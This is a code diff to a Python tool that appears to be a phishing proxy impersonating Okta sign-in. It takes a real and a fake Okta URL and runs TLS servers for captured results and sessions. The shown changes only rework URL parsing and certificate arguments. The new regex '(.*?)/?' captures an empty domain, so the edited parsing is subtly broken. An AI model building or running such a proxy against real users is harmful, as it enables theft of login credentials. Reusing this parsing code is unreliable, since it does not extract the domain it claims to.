@@ -77,9 +77,21 @@ parser.add_option('-c', '--content-type',
 
 (options, args) = parser.parse_args()
 REAL_OKTA_URL = args[0]
-REAL_OKTA_DOMAIN = re.compile(r'https?://(.*?)/').findall(REAL_OKTA_URL)[0]
+#check if URL has no slash after domain and if so add it
+REAL_OKTA_DOMAIN = re.compile(r'https?://(.*?)/?').findall(REAL_OKTA_URL)[0]
+if REAL_OKTA_URL.find(REAL_OKTA_DOMAIN) + len(REAL_OKTA_DOMAIN) == len(REAL_OKTA_URL):
+    REAL_OKTA_URL += "/"
+
 FAKE_OKTA_URL = args[1]
-FAKE_OKTA_DOMAIN = re.compile(r'https?://(.*?)/').findall(FAKE_OKTA_URL)[0]
+FAKE_OKTA_DOMAIN = re.compile(r'https?://(.*?)/?').findall(FAKE_OKTA_URL)[0]
+if FAKE_OKTA_URL.find(FAKE_OKTA_DOMAIN) + len(FAKE_OKTA_DOMAIN) == len(FAKE_OKTA_URL):
+    FAKE_OKTA_URL += "/"
+
+CERTFILE=args[2]
+KEYFILE=args[3]
+
+
+
 
 
 # For the result server
@@ -612,7 +624,7 @@ def sessions_management():
 def result_server(handler_class=Results, port=4158):
     server_address = ('', port)
     httpd = ThreadedHTTPServer(server_address, handler_class)
-    httpd.socket = ssl.wrap_socket (httpd.socket, certfile=args[2], keyfile=args[3], server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)
+    httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERTFILE, keyfile=KEYFILE, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)
     global die_lock, die
     while True:
         die_lock.acquire()
@@ -629,7 +641,7 @@ def result_server(handler_class=Results, port=4158):
 def start_server(handler_class=S, port=4298):
     server_address = ('', port)
     httpd = ThreadedHTTPServer(server_address, handler_class)
-    httpd.socket = ssl.wrap_socket (httpd.socket, certfile=args[2], keyfile=args[3], server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)
+    httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERTFILE, keyfile=KEYFILE, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)
     res = Thread(target = result_server, args = [])
     res.start()
     ses = Thread(target = sessions_management, args = [])
